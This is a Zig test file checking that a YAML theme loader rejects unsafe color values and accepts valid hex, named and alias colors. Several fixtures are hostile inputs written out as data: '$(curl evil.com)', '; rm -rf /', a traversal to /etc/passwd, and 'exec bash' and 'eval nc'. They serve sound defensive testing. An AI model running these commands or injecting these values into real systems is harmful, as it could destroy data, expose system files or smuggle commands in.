const std = @import("std");
const testing = std.testing;
const theme_loader = @import("src").theme_loader;

// `parseSkinFile`/`isSafeColorValue` are private in src/model/theme_loader.zig.
// The supported public entry point that exercises the same parse + safety
// validation is `loadThemeFromDir(allocator, theme_name, dir_path)`, which reads
// `<theme_name>.yaml` from `dir_path` and parses it. Each test writes its YAML
// fixture into a temp dir and loads it through that path. `testing.tmpDir`
// creates `.zig-cache/tmp/<sub_path>` relative to cwd (std.Io.Dir.realpathAlloc
// was removed in 0.16), so we build the relative dir path from `sub_path`.

/// Writes `content` as `skin.yaml` into a fresh temp dir and loads it through
/// the public `loadThemeFromDir` path. Caller owns the returned theme and the
/// returned `dir_path`; both must be cleaned up alongside `tmp_dir`.
fn loadFromContent(
    allocator: std.mem.Allocator,
    tmp_dir: *testing.TmpDir,
    content: []const u8,
) !theme_loader.ThemeColors {
    try tmp_dir.dir.writeFile(std.testing.io, .{ .sub_path = "skin.yaml", .data = content });

    const dir_path = try std.fmt.allocPrint(
        allocator,
        ".zig-cache/tmp/{s}",
        .{tmp_dir.sub_path},
    );
    defer allocator.free(dir_path);

    return theme_loader.loadThemeFromDir(allocator, "skin", dir_path);
}

test "theme loader rejects malicious shell commands" {
    const allocator = testing.allocator;

    var tmp_dir = testing.tmpDir(.{});
    defer tmp_dir.cleanup();

    // Test malicious YAML with command injection
    const malicious_yaml =
        \\k9s:
        \\  body:
        \\    fgColor: "$(curl evil.com)"
        \\    bgColor: "#414868; rm -rf /"
    ;

    var theme = try loadFromContent(allocator, &tmp_dir, malicious_yaml);
    defer theme_loader.deinitTheme(&theme);

    // Should fall back to default colors (not execute commands)
    // The unsafe values should be ignored
}

test "theme loader rejects path traversal" {
    const allocator = testing.allocator;

    var tmp_dir = testing.tmpDir(.{});
    defer tmp_dir.cleanup();

    const malicious_yaml =
        \\k9s:
        \\  body:
        \\    fgColor: "../../etc/passwd"
        \\    bgColor: "~/malicious"
    ;

    var theme = try loadFromContent(allocator, &tmp_dir, malicious_yaml);
    defer theme_loader.deinitTheme(&theme);
}

test "theme loader rejects command characters" {
    const allocator = testing.allocator;

    var tmp_dir = testing.tmpDir(.{});
    defer tmp_dir.cleanup();

    const malicious_yaml =
        \\k9s:
        \\  body:
        \\    fgColor: "#fff|ls"
        \\    bgColor: "#000;id"
    ;

    var theme = try loadFromContent(allocator, &tmp_dir, malicious_yaml);
    defer theme_loader.deinitTheme(&theme);
}

test "theme loader rejects dangerous commands" {
    const allocator = testing.allocator;

    var tmp_dir = testing.tmpDir(.{});
    defer tmp_dir.cleanup();

    const malicious_yaml =
        \\k9s:
        \\  body:
        \\    fgColor: "exec bash"
        \\    bgColor: "eval nc"
    ;

    var theme = try loadFromContent(allocator, &tmp_dir, malicious_yaml);
    defer theme_loader.deinitTheme(&theme);
}

test "theme loader accepts valid hex colors" {
    const allocator = testing.allocator;

    var tmp_dir = testing.tmpDir(.{});
    defer tmp_dir.cleanup();

    const valid_yaml =
        \\k9s:
        \\  body:
        \\    fgColor: "#ffffff"
        \\    bgColor: "#000000"
    ;

    var theme = try loadFromContent(allocator, &tmp_dir, valid_yaml);
    defer theme_loader.deinitTheme(&theme);

    // Should accept these valid hex colors
}

test "theme loader accepts valid named colors" {
    const allocator = testing.allocator;

    var tmp_dir = testing.tmpDir(.{});
    defer tmp_dir.cleanup();

    const valid_yaml =
        \\k9s:
        \\  body:
        \\    fgColor: "white"
        \\    bgColor: "black"
    ;

    var theme = try loadFromContent(allocator, &tmp_dir, valid_yaml);
    defer theme_loader.deinitTheme(&theme);
}

test "theme loader accepts valid color aliases" {
    const allocator = testing.allocator;

    var tmp_dir = testing.tmpDir(.{});
    defer tmp_dir.cleanup();

    const valid_yaml =
        \\k9s:
        \\  body:
        \\    fgColor: "*primary-color"
        \\    bgColor: "*bg-dark"
    ;

    var theme = try loadFromContent(allocator, &tmp_dir, valid_yaml);
    defer theme_loader.deinitTheme(&theme);
}

test "theme loader accepts default color" {
    const allocator = testing.allocator;

    var tmp_dir = testing.tmpDir(.{});
    defer tmp_dir.cleanup();

    const valid_yaml =
        \\k9s:
        \\  body:
        \\    fgColor: "default"
        \\    bgColor: "default"
    ;

    var theme = try loadFromContent(allocator, &tmp_dir, valid_yaml);
    defer theme_loader.deinitTheme(&theme);
}

test "theme loader rejects oversized files" {
    const allocator = testing.allocator;

    var tmp_dir = testing.tmpDir(.{});
    defer tmp_dir.cleanup();

    // Create a buffer larger than 100KB
    const large_content = try allocator.alloc(u8, 101 * 1024);
    defer allocator.free(large_content);
    @memset(large_content, 'x');

    var theme = try loadFromContent(allocator, &tmp_dir, large_content);
    defer theme_loader.deinitTheme(&theme);

    // Should fall back to default theme
}

test "theme loader handles empty values safely" {
    const allocator = testing.allocator;

    var tmp_dir = testing.tmpDir(.{});
    defer tmp_dir.cleanup();

    const yaml_with_empty =
        \\k9s:
        \\  body:
        \\    fgColor: ""
        \\    bgColor: ""
    ;

    var theme = try loadFromContent(allocator, &tmp_dir, yaml_with_empty);
    defer theme_loader.deinitTheme(&theme);
}
